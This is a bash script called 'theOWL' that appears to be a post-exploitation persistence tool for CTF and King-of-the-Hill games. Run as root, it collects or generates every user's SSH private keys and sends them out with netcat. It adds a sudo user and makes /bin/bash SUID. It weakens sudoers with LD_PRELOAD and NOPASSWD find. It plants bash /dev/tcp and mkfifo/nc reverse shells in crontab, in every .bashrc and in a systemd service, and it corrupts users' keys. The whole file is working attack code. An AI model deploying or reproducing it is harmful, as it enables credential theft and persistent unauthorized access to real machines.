#!/bin/bash

#############################################################
#                                                           #
#             Title: the OWL [the One-Who-Laughs]           #
#             Author: sajithat-tj                           #
#             Date: 22.05.2024                              #
#             Version: 1.0                                  #
#                                                           #
#############################################################

# -----------------------------------------------------------
# DISCLAIMER
# -----------------------------------------------------------
# This script is for educational and research purposes only.
# Misuse of this script for illegal activities is prohibited
# and the author is not responsible for any consequences.
# Use at your own risk.
# -----------------------------------------------------------


RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
MAGENTA='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[0;37m'
RESET='\033[0m'


# 1
banner(){
	echo -e '\033[0;33m
                          sSSs_sSSs     .S     S.   S.      
                         d%%SP~YS%%b   .SS     SS.  SS.     
                        d%S      `S%b  S%S     S%S  S%S     
                        S%S       S%S  S%S     S%S  S%S     
                        S&S       S&S  S%S     S%S  S&S     
                        S&S       S&S  S&S     S&S  S&S     
    s    s              S&S       S&S  S&S     S&S  S&S     
    Ss   Ss     .S%S&.  S&S       S&S  S&S     S&S  S&S     
  S%S&SS SS     SS  SS  S*b       d*S  S*S     S*S  S*b     
    SS   S%S&Sb SS%S&P  S*S.     .S*S  S*S  .  S*S  S*S.    
    SS . SS  SS YS       SSSbs_sdSSS   S*S_sSs_S*S   SS&Sbs  v1.0
    YSSP SS  Sb .S%S&P    YSSP~YSSY    SSS~SSS~S*S    YS%SP  by:sajitha-tj
                                                             \n\033[0m'
}

################ Iintial Privilage Check & Configurations ################################

initial_configuration(){
	# setting listneing ip and ports of attack machine(your machine)
	if [ -z $1 ] || [ -z $2 ]; then
		echo -e "[-] Error. Need listening IP and port.\nUsage: ./theOWL.sh MODE LISTENING_IP LISTENING_PORT\nUse h / --help for more infomation" >&2
		exit
	fi
	ATTACK_IP=$1
	ATTACK_PORT=$2

	if [[ $CHEK_FOR_PRIV_FLAG != 0 ]]; then
		# check the user privilages ; the OWL need root privilages to work properly
		if [[ $EUID -ne 0 ]];then
			echo -e "[$RED!$RESET] the OWL needs to be run as the root\n[$RED!$RESET] Use -P at the end of command if you are sure you have necessary privilages" >&2
			exit
		fi
	fi

	# directory for owl temps
	rm -r /tmp/.owl 2> /dev/null
	mkdir /tmp/.owl
	OWL_TMP="/tmp/.owl"

	# history variable
	OWL_HISTORY=()

	# current working directory
	CURR_DIR=$(pwd)

	# grab the ip of current device
	IP_THIS=$(hostname -I | cut -d " " -f 1)
	read -p "[?] $IP_THIS : Is this the correct ip address of this machine?" yn
	case $yn in
		[Nn]* )
			read -p "Enter the correct ip: " IP_THIS
			;;
	esac

	echo -e "[+] configurations completed. current directory: $CURR_DIR"

}


################ OWL functions #######################################################

# 2 | Generate ssh key pairs for each user and send private keys back
ssh_key_generator(){
	local ERR_KEY_GEN=0
	mkdir -p "$OWL_TMP/ssh"
	# going through each directory for users
	for USER in /home/*; do
		if [[ -d $USER ]]; then
			if [[ ! -f "$USER/.ssh/id_rsa" ]]; then
				mkdir -p "$USER/.ssh"
				sudo ssh-keygen -t rsa -b 4096 -N "" -f "$USER/.ssh/id_rsa" >/dev/null || ERR_KEY_GEN=1
				# for error handling
				if [[ $ERR_KEY_GEN == 0 ]]; then
				 echo -e "[+] ssh key generated for user: $(basename $USER)"
				 OWL_HISTORY+=("ssh-gen $USER/.ssh")
				else
					echo -e "[-] error occured while generating keys for user: $(basename $USER)" >&2
					ERR_KEY_GEN=0
				fi

			else
				echo -e "[+] grabbing the existing ssh key for $(basename $USER)"
			fi

			# cp $USER/.ssh/id_rsa "$OWL_TMP/ssh/id_rsa_$(basename $USER)"
			echo -e "\nPRIVATE KEY FOR $(basename $USER):\n===================================\n" | cat - $USER/.ssh/id_rsa > "$OWL_TMP/ssh/id_rsa_$(basename $USER)"
			# cp $USER/.ssh/id_rsa.pub "$OWL_TMP/ssh/id_rsa_$(basename $USER).pub"
			echo -e "\nPUBLIC KEY FOR $(basename $USER):\n===================================\n" | cat - $USER/.ssh/id_rsa.pub > "$OWL_TMP/ssh/id_rsa_$(basename $USER).pub"
		fi
	done

	ERR_KEY_GEN=0
	# key pair for root
	if [[ ! -f "/root/.ssh/id_rsa" ]]; then
		ssh-keygen -t rsa -b 4096 -N "" -f "/root/.ssh/id_rsa" >/dev/null || ERR_KEY_GEN=1
		# for error handling
		if [[ $ERR_KEY_GEN == 0 ]]; then
		 echo -e "[+] ssh key generated for root"
		 OWL_HISTORY+=("ssh-gen /root/.ssh")
		else
			echo -e "[-] error occured while generating keys for root" >&2
			ERR_KEY_GEN=0
		fi
	else
		echo -e "[+] grabbing the existing ssh key for root"
	fi
	
	# cp /root/.ssh/id_rsa "$OWL_TMP/ssh/id_rsa_root"
	echo -e "\nPRIVATE KEY FOR root:\n===================================\n" | cat - /root/.ssh/id_rsa > "$OWL_TMP/ssh/id_rsa_root"
	# cp /root/.ssh/id_rsa.pub "$OWL_TMP/ssh/id_rsa_root.pub"
	echo -e "\nPUBLIC KEY FOR root:\n===================================\n" | cat - /root/.ssh/id_rsa.pub > "$OWL_TMP/ssh/id_rsa_root.pub"

	# sending files back to local listner
	# creating a single file with all key values and sharing it
	sudo cat $OWL_TMP/ssh/id_rsa_* > $OWL_TMP/all_ssh_keys
	echo -e "[+] sending ssh keys to your machine"
	cat $OWL_TMP/all_ssh_keys | nc -w 5 $ATTACK_IP $ATTACK_PORT
	echo -e "[+] files transfered to local machine"

	# obfuscating
	read -p "Do you want to obfuscate ssh files (so others cannot use)? " yn
	case $yn in
		[Yy]* ) ssh_obfuscation	;;
	esac
}


#2.1 | Obfuscate ssh keys so that others cannot use them (specially for CTFs and KOTHs)
ssh_obfuscation(){
	# TODO: check if this works
	local ERR_SSH_OBF=0
	# going through each directory for users
	for USER in /home/*; do
		if [[ -f "$USER/.ssh/id_rsa" ]]; then
			sudo sed -i -e "s/A/o/g" "$USER/.ssh/id_rsa" || ERR_SSH_OBF=1 # replacing A with o
			sudo sed -i -e "s/e/l/g" "$USER/.ssh/id_rsa" || ERR_SSH_OBF=1 # replacing e with l
			if [[ $ERR_SSH_OBF == 0 ]]; then
				echo -e "[+] $(basename $USER)'s ssh key obfuscated"
				OWL_HISTORY+=("ssh-obf $USER/.ssh/id_rsa")
			else
				echo -e "[-] Error while obfuscating key of $(basename $USER)" >&2
				ERR_SSH_OBF=0
			fi
		fi
	done

	# root
	ERR_SSH_OBF=0
	if [[ -f "/root/.ssh/id_rsa" ]]; then
		sudo sed -i -e "s/A/o/g" "/root/.ssh/id_rsa" || ERR_SSH_OBF=1 # replacing A with o
		sudo sed -i -e "s/e/l/g" "/root/.ssh/id_rsa" || ERR_SSH_OBF=1 # replacing e with l
		if [[ $ERR_SSH_OBF == 0 ]]; then
			echo -e "[+] root's ssh key obfuscated"
			OWL_HISTORY+=("ssh-obf /root/.ssh/id_rsa")
		else
			echo -e "[-] Error while obfuscating key of root" >&2
		fi
	fi
	echo -e "[+] ssh files are fu*ked. (Evil laugh)"
}


# 3 | add a new custom user with root privilages
add_new_user(){
	local USR_ERR=0 # for identifying errors
	read -p "[!] enter a username for new user: " USERNAME
	adduser $USERNAME || USR_ERR=1
	usermod -aG sudo $USERNAME || USR_ERR=1
	
	if [[ $USR_ERR == 0 ]]; then
		echo -e "[+] $USERNAME : new user added."
		chmod u+s /bin/bash
		OWL_HISTORY+=("new-usr $USERNAME")
	else
		echo -e "[-] Error occured!" >&2
	fi
}



# 4 | set up LD_PRELOAD vulnerability and sudo for find
add_ld_preload_for_find(){
	LD_PRELOAD_IS_THERE=$(grep "LD_PRELOAD" /etc/sudoers)
	if [[ $LD_PRELOAD_IS_THERE == "" ]]; then
		echo "Defaults    env_keep += LD_PRELOAD" >> /etc/sudoers
		echo -e "[+] LD_PRELOAD added to sudoers"
		OWL_HISTORY+=("ld-pre /etc/sudoers")
	fi
	echo -e "[!] LD_PRELOAD already exists in sudoers"

	read -p "Enter a valid username to give privilages: " USER
	if [[ -d "/home/$USER" ]]; then
		echo "$USER ALL=(ALL:ALL) NOPASSWD: /usr/bin/find" >> /etc/sudoers
		echo "[+] sudo privilages given for 'find' for the user: $USER"
		OWL_HISTORY+=("sudo-find /etc/sudoers $USER")
	else
		echo "[-] $USER is not a user"
	fi
}


# 5 | add crontab commands to start reverse shells
add_to_crontab(){
	local LPORT=$ATTACK_PORT
	local CURRENT_MODE=$1
	# do not ask for a listening port with auto mode
	if [[ $CURRENT_MODE != "auto" ]]; then
		read -p "[?] Enter a listening port(default $ATTACK_PORT): " LPORT
		if [[ $LPORT == "" ]]; then
			LPORT=$ATTACK_PORT
		fi
	fi
	# basic bash tcp reverse shell
	sudo echo "* * * * * root /bin/bash -c 'bash -i >& /dev/tcp/$ATTACK_IP/$LPORT 0>&1'" >> /etc/crontab
	# netcat listner with mkfifo
	sudo echo "* * * * * root rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc $ATTACK_IP $LPORT > /tmp/f" >> /etc/crontab

	echo "[+] 2 crontabs configured. open a listener on $ATTACK_IP:$LPORT"
	OWL_HISTORY+=("crontab /etc/crontab $ATTACK_IP $LPORT")
}


#6 | edit bashrc to spawn a reverse shell
edit_bashrc(){
	# editing bashrc may not be a good idea since it prevents using the shell
	local LPORT=$ATTACK_PORT
	local CURRENT_MODE=$1
	# do not ask for a listening port with auto mode
	if [[ $CURRENT_MODE != "auto" ]]; then
		read -p "[?] Enter a listening port(default $ATTACK_PORT): " LPORT
		if [[ $LPORT == "" ]]; then
			LPORT=$ATTACK_PORT
		fi
	fi

	local REV_CMD="/bin/bash -c 'bash -i >& /dev/tcp/$ATTACK_IP/$LPORT 0>&1'"

	for USER in /home/*; do
		if [[ -d $USER ]]; then
			echo "$REV_CMD" >> "$USER/.bashrc"
			OWL_HISTORY+=("bashrc $USER/.bashrc $ATTACK_IP $LPORT")
		fi
	done

	echo "$REV_CMD" >> "/root/.bashrc"
	OWL_HISTORY+=("bashrc /root/.bashrc $ATTACK_IP $LPORT")
	echo "[+] shells added to bashrc. listen on $ATTACK_IP:$LPORT"
}


#7 | systemd service reverse shell
systemd_service_revshell(){
	local LPORT=$ATTACK_PORT
	local CURRENT_MODE=$1
	# do not ask for a listening port with auto mode
	if [[ $CURRENT_MODE != "auto" ]]; then
		read -p "[?] Enter a listening port(default $ATTACK_PORT): " LPORT
		if [[ $LPORT == "" ]]; then
			LPORT=$ATTACK_PORT
		fi
	fi

	mkdir /root/owl
	echo -e "#!/bin/bash\n/bin/bash -c 'bash -i >& /dev/tcp/$ATTACK_IP/$LPORT 0>&1'" > /root/owl/syswl.sh

	local SHELL_SERVICE="[Unit]
Description=Open system for WL service
After=network.target

[Service]
Restart=always
RestartSec=30
ExecStart=sudo bash /root/owl/syswl.sh

[Install]
WantedBy=default.target"
	
	sudo echo "$SHELL_SERVICE" > /etc/systemd/system/syswl.service
	systemctl daemon-reload
	systemctl enable syswl.service
	systemctl start syswl.service

	echo -e "[+] systemd service added"
	OWL_HISTORY+=("sys-svc /etc/systemd/system/syswl.service syswl.service /root/owl/")
}


#8 | display history
show_history(){
	if [[ -z $OWL_HISTORY ]]; then
		echo "[-] Nothing to show yet"
		return
	fi
	for HISTORY_ELEM in "${OWL_HISTORY[@]}"; do
		echo $HISTORY_ELEM
	done
}


###############
## TODO: need a force reverse method.specially when working with auto-mode
###############
# reverse all changes back to normal
reverse_owl_changes(){
	# check for force reverse
	if [[ $1 == "--force-reverse" ]]; then
		if [[ -f $2 ]]; then
			OWL_HISTORY=()
			while IFS= read -r line; do
				OWL_HISTORY+=("$line")
			done < $2
			echo -e "------------------------------- HISTORY -------------------------------"
			show_history
			echo -e "-----------------------------------------------------------------------"
			rm $2
		else
			echo -e "Invalid Command for --force-reverse.\nUsage: ./theOWL.sh --force-reverse <history_file>\nUse h / --help for more infomation" >&2
	fi

	# empty check
	if [[ -z $OWL_HISTORY ]]; then
		echo "[-] Nothing to reverse!"
		return
	fi

	read -p "[?] Are you sure you want to revert changes? " yn
	if [[ $yn == [Nn]* ]]; then
		echo -e "[-] reverse process stopped!"
		return
	fi

	# loop through history and try to reverse each
	for HISTORY_ELEM in "${OWL_HISTORY[@]}"; do
		# history elements: owl_command path/name
		local HST_CMD=$(echo $HISTORY_ELEM | cut -d" " -f1) # command part of history
		local HST_ARG=$(echo $HISTORY_ELEM | cut -d" " -f2) # first argument/ 2nd value(path or username etc.)
		case $HST_CMD in
			ssh-gen ) # delete .ssh directory
				if [[ -d $HST_ARG ]]; then
					sudo rm -r $HST_ARG
					echo -e "[+] ssh directory removed: $HST_ARG"
				fi
				;;
			ssh-obf ) # nothing to do
				echo -e "[-] cannot reverse obfuscated ssh file: $HST_ARG"
				echo -e "[!] You can replace them from files in your local machine"
				;;
			new-usr ) # remove user
				local ERR_USR_DEL=0
				read -p "Are you sure you want to remove user: $HST_ARG? " yn
				case $yn in
					[Yy]* )
						sudo userdel -rf $HST_ARG || ERR_USR_DEL=1
						chmod u-s /bin/bash
						if [[ $ERR_USR_DEL == 0 ]]; then
						 echo -e "[+] user removed:$HST_ARG"
						fi
						;;
					* )
						echo -e "[-] Not removing user $HST_ARG"
						;;
				esac
				;;
			ld-pre )
				sudo sed -i "/Defaults    env_keep += LD_PRELOAD/d" "$HST_ARG"
				echo -e "[+] LD_PRELOAD configuration removed"
				;;
			sudo-find )
				local USER=$(echo $HISTORY_ELEM | cut -d" " -f3)
				sudo sed -i "/$USER ALL=(ALL:ALL) NOPASSWD: \/usr\/bin\/find/d" "$HST_ARG"
				echo -e "[+] sudo find configuration removed for $USER"
				;;
			crontab ) # remove crontab commands i.e. lastlines of crontab
				local ERR_CRON=0
				local A_IP=$(echo $HISTORY_ELEM | cut -d" " -f3)
				local A_PORT=$(echo $HISTORY_ELEM | cut -d" " -f4)
				local CRON_CMD_1="* * * * * root \/bin\/bash -c 'bash -i >& \/dev\/tcp\/$A_IP\/$A_PORT 0>&1'"
				local CRON_CMD_2="* * * * * root rm \/tmp\/f; mkfifo \/tmp\/f; cat \/tmp\/f | \/bin\/sh -i 2>&1 | nc $A_IP $A_PORT > \/tmp\/f"
				sudo sed -i -e "/$CRON_CMD_1/d" "$HST_ARG" || ERR_CRON=1
				sudo sed -i -e "/$CRON_CMD_2/d" "$HST_ARG" || ERR_CRON=1
				if [[ $ERR_CRON=0 ]]; then
					echo -e "[+] crontab commands removed"
				else
					echo -e "[+] error while removing crontabs" >&2
				fi
				;;
			bashrc ) # remove bashrc commands i.e. lastlines of .bashrc
				local ERR_BASHRC=0
				if [[ -f $HST_ARG ]]; then
					local A_IP=$(echo $HISTORY_ELEM | cut -d" " -f3)
					local A_PORT=$(echo $HISTORY_ELEM | cut -d" " -f4)
					local BASHRC_CMD_1="\/bin\/bash -c 'bash -i >& \/dev\/tcp\/$A_IP\/$A_PORT 0>&1'"
					
					sudo sed -i -e "/$BASHRC_CMD_1/d" "$HST_ARG" || ERR_BASHRC=1
					if [[ $ERR_BASHRC == 0 ]]; then
						echo -e "[+] .bashrc file restored: $HST_ARG"
					fi

				fi
				;;
			sys-svc )
				local SVC_NAME=$(echo $HISTORY_ELEM | cut -d" " -f3)
				local SVC_SCRIPT=$(echo $HISTORY_ELEM | cut -d" " -f4)
				systemctl disable $SVC_NAME
				systemctl stop $SVC_NAME
				if [[ -f $HST_ARG ]]; then
					sudo rm "$HST_ARG"
				fi
				if [[ -d $SVC_SCRIPT ]]; then
					sudo rm -r "$SVC_SCRIPT"
				fi
				echo -e "[+] $SVC_NAME systemd service removed"
				;;
		esac
	done
	echo -e "[+] all changes reversed!"
}


# TODO:
#  3- maybe a RootKit
#  5- clear presence

clean_my_work(){
	echo -e "[+] Cleaning my work here!"
	sudo rm -r $OWL_TMP
	# TODO: need to implement proper methods to clear records
}


################ Help message ###################################################

show_usage(){
	echo -e "Usage: ./theOWL.sh MODE LISTENING_IP LISTENING_PORT

theOWL is a bash script designed to help ensure continued access to a target system by performing several actions that enhance access privileges and establish multiple backdoor mechanisms. This tool is intended for educational and research purposes only.
theOWL needs sudo privilages to function properly. It uses userID to check if current user is root.
You can use '-P' flag at the end of command to overide this feature. This might be useful with a privilaged user account other than root. Anyway this is not recommended and may raise unexpected errors on the go.

MODE:
  a / auto         Auto-mode. Automatically run through each function of theOWL
  t / terminal     Terminal-mode. Returns a terminal to manually configure and run functions
  --force-reverse  revert changes done by auto-mode 'sudo ./theOWL.sh --force-reverse <history_file>'
  h / --help       display help message(this message)

AUTO-MODE:
  Auto-mode is for quick setups. It does not allow customization of listening ports but uses the same port for every backdoor. It is useful when time is limited, ensuring multiple backdoor access methods within seconds.

TERMINAL-MODE:
	Terminal-mode allows you to selectively execute functions, providing more flexible persistent methods. You can set up different listening ports for different backdoors, ensuring continuous access to the system for a longer time. Use h/?/help as a command in terminal-mode for more infomation.  

FORCE-REVERSE:
  When using auto-mode, it will create a file .owl_hst_tmp in the current working directory to store the history. You can use this file later to revert changes made in auto-mode as follows: sudo ./theOWL.sh --force-reverse .owl_hst_tmp

EXAMPLE:
  ./theOWL.sh t 127.0.0.1 2323     run in terminal-mode with given ip and port as listeners
  ./theOWL.sh a 127.0.0.1 2323     run in auto-mode with given ip and port as listeners
  ./theOWL.sh t 127.0.0.1 2323 -P  ignore root privilages checking and run in terminal-mode
  ./theOWL.sh -h                   display help message
"
}

################ Terminal-Mode ##################################################

display_terminal_help(){
	echo -e "
     Command       | Description
-------------------|-------------------------------------------
   ? / h /help     | display terminal-mode commands
  1 / ssh_key_gen  | generate ssh key pairs for all users
   2 / new_user    | add a new user as root
   3 / ld_pre      | setup LD_PRELOAD and 'find' in sudoers
   4 / crontab     | configure crontab 
   5 / bashrc      | edit bashrc files
   6 / systemd     | add a reverse shell as a systemd service
  so / ssh_obfus   | obfuscate ssh keys of all users
   9 / history     | display history (changes did)
   0 / reverse     | revert all changes back!
   bye / exit      | exit out of the OWL"
}

terminal_mode_loop(){
	display_terminal_help
	while [[ 1 ]]; do
		echo ""
		read -p " ~> " CMD
		case $CMD in
			"?" | h | help ) display_terminal_help ;;
			1 | ssh_key_gen )	ssh_key_generator ;;
			2 | new_user )	add_new_user ;;
			3 | ld_pre ) add_ld_preload_for_find ;;
			4 | crontab ) add_to_crontab ;;
			5 | bashrc ) edit_bashrc ;;
			so | ssh_obfus ) ssh_obfuscation ;;
			6 | systemd ) systemd_service_revshell ;;
			9 | history ) show_history ;;
			0 | reverse ) reverse_owl_changes ;;
			exit | bye )
				clean_my_work
				echo -e "[*] Goodbye soldier!$YELLOW laugh more!!$RESET"
				exit
				;;
			* )
				echo -e "[!] invalid command" >&2
				;;
		esac
	done
}

################ Auto-Mode ##################################################
auto_mode_owl(){
	ssh_key_generator
	add_new_user
	add_to_crontab "auto"
	edit_bashrc "auto"
	systemd_service_revshell "auto"
	# add_php_reverse_shell
	ssh_obfuscation
	clean_my_work
	echo -e "[+] All done!"
	for HISTORY_ELEM in "${OWL_HISTORY[@]}"; do
		echo -e "$HISTORY_ELEM" >> .owl_hst_tmp;
	done
	echo -e "[*] Goodbye soldier!$YELLOW laugh more!!$RESET"
}

################ MAIN-CODE #####################################################

CHEK_FOR_PRIV_FLAG=1 # if true(1): check for privilages [at the initial configuration]
if [[ "${@: -1}" == "-P" ]];then
	echo -e "[!] Not checking for sudo privilages.(Not recommended)\n[!] You may still need to enter the password for some functions to work properly\n[!] This method might raise unexpected errors!"
	CHEK_FOR_PRIV_FLAG=0
fi

banner
case $1 in
	h | help | -h | --help )
		show_usage
		;;
	a | auto )
		initial_configuration $2 $3
		echo -e "[+] the OWL:$YELLOW Auto-mode$RESET"
		auto_mode_owl
		;;
	t | terminal )
		initial_configuration $2 $3
		echo -e "[+] the OWL:$YELLOW Terminal-mode$RESET"
		terminal_mode_loop
		;;
	--force-reverse )
		reverse_owl_changes $1 $2
		;;
	* )
		echo -e "Invalid Command.\nUsage: ./theOWL.sh MODE LISTENING_IP LISTENING_PORT\nUse h / --help for more infomation" >&2
		;;
esac